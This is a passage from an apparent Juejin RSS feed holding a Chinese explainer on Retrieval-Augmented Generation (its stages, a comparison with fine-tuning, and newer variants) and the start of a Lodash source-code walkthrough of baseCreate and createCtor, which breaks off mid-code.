                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 引言：大模型的“阿喀琉斯之踵”</h2>
<p>自 2023 年生成式 AI 爆发以来，我们见证了 LLM（大语言模型）惊人的通识能力。然而，到了 2026 年的今天，在企业级落地和垂直领域应用中，单纯依赖原生 LLM 的弊端早已显露无疑。</p>
<p>无论模型的参数量 scaling 到多大，它们始终面临着<strong>三大核心痛点</strong>：</p>
<p>1.<strong>幻觉问题（Hallucination）</strong> ：模型在不知道答案时倾向于“一本正经地胡说八道”，这在医疗、法律等严谨场景是不可接受的。</p>
<p>2.<strong>知识时效性（Outdated Knowledge）</strong> ：模型的知识截止于训练数据的时间点。重新训练一个万亿参数的模型既昂贵又耗时，无法做到实时更新。</p>
<p>3.<strong>私有数据黑盒（Private Data Inaccessibility）</strong> ：企业拥有大量的内部文档、SOP、数据库，这些数据是高价值的资产，但通用的 LLM 无法触及，且出于数据安全考虑，企业也不愿将其直接用于公有云模型的微调。</p>
<p>为了解决这些“阿喀琉斯之踵”，<strong>RAG（Retrieval-Augmented Generation，检索增强生成）</strong> 技术应运而生，并迅速成为 AI 2.0 时代企业应用落地的标准架构。</p>
<h2 data-id="heading-1">2. 什么是 RAG？——给大模型一场“开卷考试”</h2>
<h3 data-id="heading-2">2.1 定义与本质</h3>
<p>RAG，全称 Retrieval-Augmented Generation（检索增强生成），是一种将预训练的大语言模型（LLM）与外部知识检索系统相结合的架构。</p>
<p>通俗来说，如果传统的 ChatGPT 问答是“闭卷考试”（完全依赖模型训练时记住的参数知识），那么 <strong>RAG 就是一场“开卷考试”</strong> 。当用户提出问题时，系统首先去外部知识库（课本、参考书）中查找相关资料，然后将这些资料连同问题一起交给大模型，让大模型基于参考资料生成准确的答案。</p>
<p>正如 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.redhat.com%2Fzh-cn%2Ftopics%2Fai%2Fwhat-is-retrieval-augmented-generation" target="_blank" title="https://www.redhat.com/zh-cn/topics/ai/what-is-retrieval-augmented-generation" ref="nofollow noopener noreferrer">RedHat</a> 所定义的那样，RAG 是一种能够提高生成式 AI 应用所生成答案的质量和相关性的技术，它的工作原理是将大语言模型的预训练知识与外部资源关联起来。</p>
<h3 data-id="heading-3">2.2 RAG 的核心价值</h3>
<p>根据行业实践经验总结，RAG 技术主要带来了以下价值：</p>
<p>•<strong>准确性提升</strong>：通过引入外部知识库，显著减少了模型的幻觉，利用检索到的事实数据约束模型的生成结果。</p>
<p>•<strong>知识实时性</strong>：无需重新训练模型，只需更新向量数据库中的文档，即可让 AI 掌握最新的新闻、政策或产品信息。</p>
<p>•<strong>数据安全性与隐私</strong>：企业数据保留在本地或私有向量库中，大模型仅作为推理引擎，实现了数据所有权与模型能力的解耦。<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cio.com.tw%2Frag-technology-ideal-for-enterprise-knowledge-management-and-the-ideal-combination-of-raw-ai%2F" target="_blank" title="https://www.cio.com.tw/rag-technology-ideal-for-enterprise-knowledge-management-and-the-ideal-combination-of-raw-ai/" ref="nofollow noopener noreferrer">RAG技術：企業知識管理與生成式AI 的理想結合方案</a>。</p>
<p>•<strong>可解释性</strong>：RAG 生成的内容可以标注引用来源（Citation），让用户知道答案出自哪篇文档的哪一段，建立了信任。</p>
<h2 data-id="heading-4">3. RAG 的技术原理与标准流程</h2>
<p>RAG 的标准流程可以概括为三个核心阶段：<strong>索引（Indexing）、检索（Retrieval）和生成（Generation）</strong> 。这是一个实现了“检索”与“生成”有机结合的闭环系统。</p>
<h3 data-id="heading-5">3.1 第一阶段：索引（Indexing）——构建知识库</h3>
<p>这是 RAG 的地基，决定了系统能“看到”什么知识。</p>
<p>1.<strong>数据提取（Data Extraction）</strong> ：从各种来源（PDF、Word、HTML、Markdown、数据库）提取原始文本。</p>
<p>2.<strong>分块（Chunking）</strong> ：由于 LLM 的上下文窗口（Context Window）限制以及检索精度的考量，我们需要将长文本切分为较小的片段（Chunks）。</p>
<p>3.<strong>向量化（Embedding）</strong> ：利用 Embedding 模型将文本块转化为高维向量（Vectors）。向量是计算机理解语义的数学形式。</p>
<p>4.<strong>存储（Indexing/Storage）</strong> ：将生成的向量及对应的元数据存储在 <strong>向量数据库（Vector Database）</strong> 中，如 Milvus、Pinecone、Weaviate 或 Faiss。</p>
<h3 data-id="heading-6">3.2 第二阶段：检索（Retrieval）——寻找相关信息</h3>
<p>当用户发起提问时，系统执行检索操作：</p>
<p>1.<strong>查询向量化</strong>：将用户的 Query 使用同样的 Embedding 模型转化为查询向量 q。</p>
<p>2.<strong>相似度计算</strong>：在向量数据库中计算 q与存储的文档向量 di之间的相似度。最常用的度量方式是 <strong>余弦相似度（Cosine Similarity）</strong> 。 其数学公式如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/238d5289e3674e1595e1261627e0026b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWliaWdkYXRh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768979075&amp;x-signature=a87Q38lkuYYxBhq3MErxPq1ZjKU%3D" alt="" loading="lazy"/></p>
<p>1.<strong>Top-K 召回</strong>：根据相似度得分，检索出最相关的 K个文本块（Context）。</p>
<h3 data-id="heading-7">3.3 第三阶段：生成（Generation）——智慧融合</h3>
<p>这是最后一步，将检索结果转化为自然语言回答：</p>
<p>1.<strong>Prompt 组装</strong>：将用户的原始问题（Query）与检索到的上下文（Context）填充到预设的 Prompt 模板中。</p>
<p><em>Prompt 示例</em>：</p>
<blockquote>
<p>"请基于以下参考信息回答用户的问题。如果参考信息不足以回答，请说不知道。 参考信息：[Chunk 1]... [Chunk 2]... 用户问题：..."</p>
</blockquote>
<p>1.<strong>LLM 推理</strong>：将增强后的 Prompt 输入给大模型。</p>
<p>2.<strong>生成回答</strong>：模型综合上下文信息，生成最终答案。</p>
<p>从概率角度看，RAG 改变了模型的生成概率分布。传统生成的概率是 P(y∣x)P(y∣x)，而 RAG 是基于检索内容 zz的生成：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01f6edf61cdb464b929e40cb5b10bc74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWliaWdkYXRh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768979075&amp;x-signature=L0fIMsNO3HEy24os4pyq6aX4c9Q%3D" alt="" loading="lazy"/></p>
<p>其中 z是检索到的外部知识，P(z∣x)P(z∣x) 代表检索的相关性，P(y∣x,z)P(y∣x,z) 代表基于检索内容生成的概率。</p>
<h2 data-id="heading-8">4. RAG vs. 微调（Fine-Tuning）：如何选择？</h2>
<p>在 AI 工程化落地中，经常会有“RAG 和 微调哪个好？”的争论。根据 <a href="https://link.juejin.cn?target=https%3A%2F%2Fvocus.cc%2Farticle%2F67726335fd897800014ba973" target="_blank" title="https://vocus.cc/article/67726335fd897800014ba973" ref="nofollow noopener noreferrer">RAG和Fine-Tuning有什麼不同？</a> 以及其它参考内容：</p>






























<table><thead><tr><th>维度</th><th>RAG (检索增强生成)</th><th>Fine-Tuning (微调)</th></tr></thead><tbody><tr><td><strong>核心能力</strong></td><td><strong>知识获取</strong>：擅长利用外部、实时的具体信息。</td><td><strong>能力内化</strong>：擅长学习特定的指令格式、语言风格或复杂推理模式。</td></tr><tr><td><strong>数据更新频率</strong></td><td><strong>高</strong>：更新数据库即可，立等可取，成本极低。</td><td><strong>低</strong>：需要重新训练，周期长，成本高。</td></tr><tr><td><strong>准确性/幻觉</strong></td><td><strong>低幻觉</strong>：答案有据可依，可追溯来源。</td><td><strong>仍有幻觉</strong>：模型可能记住错误知识或产生记忆混淆。</td></tr><tr><td><strong>适用场景</strong></td><td>实时新闻、企业知识库问答、客服助手、法律法规查询。</td><td>医疗诊断推理、特定格式代码生成、角色扮演（风格模仿）。</td></tr></tbody></table>
<p><strong>结论</strong>：</p>
<p>•如果你的应用需要<strong>动态响应</strong>、<strong>频繁更新外部知识</strong>（如每天的股市简报），RAG 是不二之选。</p>
<p>•如果你需要模型深度掌握<strong>固定领域内的推理范式</strong>或<strong>特定的语言风格</strong>（如模仿莎士比亚写作），微调更合适。</p>
<p>•<strong>RAG + 微调</strong>：在 2026 年的高级应用中，通常采用混合模式。例如，用微调让模型学会“如何阅读医疗报告”，再用 RAG 提供“患者的实时体检数据”。</p>
<h2 data-id="heading-9">5. RAG 技术的进阶与未来（2026 视野）</h2>
<p>随着技术的发展，基础的 RAG（Naive RAG）已经演化出更多高级形态：</p>
<p>•<strong>Modular RAG（模块化 RAG）</strong> ：将检索、重排（Re-ranking）、生成等环节解耦，允许开发者像搭积木一样替换更强的组件。<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fshao__meng%2Fstatus%2F1839258531398324708" target="_blank" title="https://x.com/shao__meng/status/1839258531398324708" ref="nofollow noopener noreferrer">深入理解高级RAG 技术</a>。</p>
<p>•<strong>GraphRAG（图谱增强 RAG）</strong> ：微软等机构提出的结合知识图谱（Knowledge Graph）的 RAG。它不仅检索向量相似的片段，还能通过图谱关系找到实体之间的深层逻辑关联，解决跨文档的复杂推理问题。</p>
<p>•<strong>Agentic RAG（代理式 RAG）</strong> ：RAG 不再是一个单向流程，而是一个智能体（Agent）。它可以自主判断检索到的内容是否足够，如果不够，它会修改搜索关键词重新检索，甚至使用工具去联网搜索，直到找到满意答案。</p>
<h2 data-id="heading-10">6. 总结</h2>
<p>RAG 技术并不是简单的“搜索+粘贴”，它是一场让大模型从“记忆者”转变为“思考者”的架构革命。</p>
<p>通过本文，我们明确了 RAG 的定义：<strong>利用检索外部文档提升生成结果质量，充分利用领域知识和私有数据、实时数据，减少生成不确定性</strong>。</p>
<p>后续将继续系列文章中，从理论走向实战，争取动手搭建开发环境，写出第一行 RAG 代码，实现一个简易的“个人知识库助手”。</p>
<p><strong>参考文献与延伸阅读：</strong></p>
<p>1.<a href="https://link.juejin.cn?target=https%3A%2F%2Fsolwen.ai%2Fposts%2Fwhat-is-rag" target="_blank" title="https://solwen.ai/posts/what-is-rag" ref="nofollow noopener noreferrer">什麼是RAG？初學者也看得懂的檢索增強生成（RAG）基礎指南！ - Solwen.ai</a></p>
<p>2.<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.redhat.com%2Fzh-cn%2Ftopics%2Fai%2Fwhat-is-retrieval-augmented-generation" target="_blank" title="https://www.redhat.com/zh-cn/topics/ai/what-is-retrieval-augmented-generation" ref="nofollow noopener noreferrer">什么是检索增强生成？ - RedHat</a></p>
<p>3.<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2FBaihai_IDP%2Farticle%2Fdetails%2F133853738" target="_blank" title="https://blog.csdn.net/Baihai_IDP/article/details/133853738" ref="nofollow noopener noreferrer">RAG技术详解：揭秘基于垂直领域专有数据的生成 - CSDN</a></p>
<p>4.<a href="https://link.juejin.cn?target=https%3A%2F%2Fvocus.cc%2Farticle%2F67726335fd897800014ba973" target="_blank" title="https://vocus.cc/article/67726335fd897800014ba973" ref="nofollow noopener noreferrer">RAG和Fine-Tuning有什麼不同？深入解析兩大方法的應用與差異 - Vocus</a></p>
<p>5.<a href="https://link.juejin.cn?target=https%3A%2F%2Faiapi.sheincorp.cn%2Fchat%2Fsource_text" target="_blank" title="https://aiapi.sheincorp.cn/chat/source_text" ref="nofollow noopener noreferrer">RAG 快速开发实战 - 极客时间</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Lodash 源码解读与原理分析 - Lodash 对象创建的完整流程]]></title>    <link>https://juejin.cn/post/7594851429162123298</link>    <guid>https://juejin.cn/post/7594851429162123298</guid>    <pubDate>2026-01-14T08:47:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594851429162123298" data-draft-id="7594742976711720994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Lodash 源码解读与原理分析 - Lodash 对象创建的完整流程"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-14T08:47:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Anita_Sun"/> <meta itemprop="url" content="https://juejin.cn/user/1811635884786839"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Lodash 源码解读与原理分析 - Lodash 对象创建的完整流程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1811635884786839/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Anita_Sun
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:47:36.000Z" title="Wed Jan 14 2026 08:47:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、核心底层工具：<code>baseCreate</code></h2>
<p><code>baseCreate</code> 是 Lodash 实现跨环境原型继承的核心函数，是所有包装器、构造函数继承的底层依赖，兼具<strong>性能优化</strong>、<strong>内存安全</strong>和<strong>环境兼容</strong>三大特性。</p>
<h3 data-id="heading-1">1. 完整实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> baseCreate = (<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 闭包缓存临时构造函数，避免重复创建带来的性能开销</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">object</span>(<span class="hljs-params"/>) {}
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">proto</span>) {
    <span class="hljs-comment">// 1. 边界处理：非对象类型原型直接返回空对象，避免继承异常</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isObject</span>(proto)) {
      <span class="hljs-keyword">return</span> {};
    }
    <span class="hljs-comment">// 2. 性能优先：优先使用 ES5 原生 Object.create（现代环境性能更优）</span>
    <span class="hljs-keyword">if</span> (objectCreate) {
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">objectCreate</span>(proto);
    }
    <span class="hljs-comment">// 3. 兼容低版本：模拟 Object.create 实现原型继承</span>
    object.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = proto;
    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> object;
    <span class="hljs-comment">// 重置临时构造函数原型，防止原型污染和内存泄漏</span>
    object.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-literal">undefined</span>;
    <span class="hljs-keyword">return</span> result;
  };
}());
</code></pre>
<h3 data-id="heading-2">2. 特性对比与核心应用</h3>






























<table><thead><tr><th>特性</th><th>baseCreate</th><th>原生 Object.create</th></tr></thead><tbody><tr><td>环境支持</td><td>ES3+（兼容 IE6/7/8）</td><td>ES5+（仅 IE9+）</td></tr><tr><td>边界处理</td><td>非对象原型返回 <code>{}</code></td><td>非对象原型抛 <code>TypeError</code></td></tr><tr><td>性能（100 万次调用）</td><td>原生模式～12ms；模拟模式～25ms</td><td>~10ms（仅支持环境）</td></tr><tr><td>内存安全</td><td>自动重置临时构造函数原型</td><td>无额外内存处理逻辑</td></tr></tbody></table>
<p><strong>核心应用场景</strong> ：</p>
<ol>
<li><strong>原型继承</strong>：创建继承指定原型的对象，替代 <code>new 构造函数</code> 避免冗余属性；</li>
<li><strong>包装器原型创建</strong>：<code>LodashWrapper</code>/<code>LazyWrapper</code> 均通过它继承 <code>baseLodash.prototype</code>；</li>
<li><strong>构造函数模拟</strong>：<code>createCtor</code> 中模拟 <code>new</code> 关键字，保证实例原型链正确；</li>
<li><strong>对象克隆</strong>：<code>baseClone</code> 底层依赖它，保证克隆对象继承原对象原型（区别于 <code>Object.assign</code> 丢失原型）；</li>
<li><strong>函数包装</strong>：<code>_.partial</code> 等方法创建偏函数时，继承原函数原型。</li>
</ol>
<p><strong>基础验证示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> parent = { <span class="hljs-attr">name</span>: <span class="hljs-string">'parent'</span>, <span class="hljs-attr">sayHi</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">'hello'</span> };
<span class="hljs-keyword">var</span> child = <span class="hljs-title function_">baseCreate</span>(parent);
child.<span class="hljs-property">name</span> = <span class="hljs-string">'child'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-title function_">sayHi</span>()); <span class="hljs-comment">// hello</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(child) === parent); <span class="hljs-comment">// true</span>
</code></pre>
<h2 data-id="heading-3">二、构造函数体系</h2>
<p>Lodash 定义了一套构造函数体系，覆盖<strong>值包装</strong>、<strong>惰性求值</strong>、<strong>哈希存储</strong>、<strong>构造函数兼容</strong>四大核心场景，所有构造函数均基于 <code>baseCreate</code> 实现原型复用，避免重复逻辑。</p>
<h3 data-id="heading-4">1. 构造函数完整对照表</h3>









































<table><thead><tr><th>构造函数</th><th>核心作用</th><th>关键属性 / 方法</th><th>设计亮点与细节</th></tr></thead><tbody><tr><td><strong>baseLodash</strong></td><td>所有包装器的原型链根载体</td><td>挂载通用方法：<code>value()</code>/<code>chain()</code></td><td>空函数，仅作为原型载体；抽离通用方法，避免所有包装器重复定义</td></tr><tr><td><strong>LodashWrapper</strong></td><td>普通值包装器，处理通用链式调用</td><td><code>__wrapped__</code>（原始值）、<code>__actions__</code>（操作队列）、<code>__chain__</code>（链式标记）、<code>__index__</code>（遍历索引）、<code>__values__</code>（结果缓存）</td><td>操作队列化存储；支持链式 / 非链式模式切换；非链式模式下调用方法直接返回结果</td></tr><tr><td><strong>LazyWrapper</strong></td><td>惰性包装器，优化数组批量操作</td><td><code>__wrapped__</code>（原始数组）、<code>__actions__</code>（惰性操作队列）、<code>__dir__</code>（遍历方向）、<code>__filtered__</code>（过滤标记）、<code>__iteratees__</code>（迭代器队列）、<code>__takeCount__</code>（短路阈值）、<code>__views__</code>（数组视图）</td><td>仅对数组生效；操作延迟执行；单次遍历 + 短路优化；支持正向 / 反向遍历，无需反转数组</td></tr><tr><td><strong>Hash</strong></td><td>兼容 ES3 的哈希表（替代 ES6 Map）</td><td><code>__data__</code>（无原型存储）、<code>size</code>（实时计数）；原型方法：<code>get/set/delete/clear/has</code></td><td>用 <code>HASH_UNDEFINED</code> 占位 <code>undefined</code> 值；<code>__data__</code> 基于 <code>Object.create(null)</code>，避免键名冲突</td></tr><tr><td><strong>createCtor</strong></td><td>构造函数包装工具，兼容 <code>new</code>/ 普通调用</td><td>0-7 参数直接 <code>new</code> 调用；超 7 参数用 <code>baseCreate+apply</code> 模拟</td><td>性能优化常见参数场景；严格遵循 ES 构造函数返回规则；兼容 ES6 class</td></tr></tbody></table>
<h3 data-id="heading-5">2. 构造函数实现</h3>
<h4 data-id="heading-6">（1）<code>createCtor</code> 完整实现</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCtor</span>(<span class="hljs-params">Ctor</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> args = <span class="hljs-variable language_">arguments</span>;
    <span class="hljs-comment">// 性能优化：0-7 个参数直接 new 调用（覆盖 90%+ 场景）</span>
    <span class="hljs-keyword">switch</span> (args.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>(args[<span class="hljs-number">0</span>]);
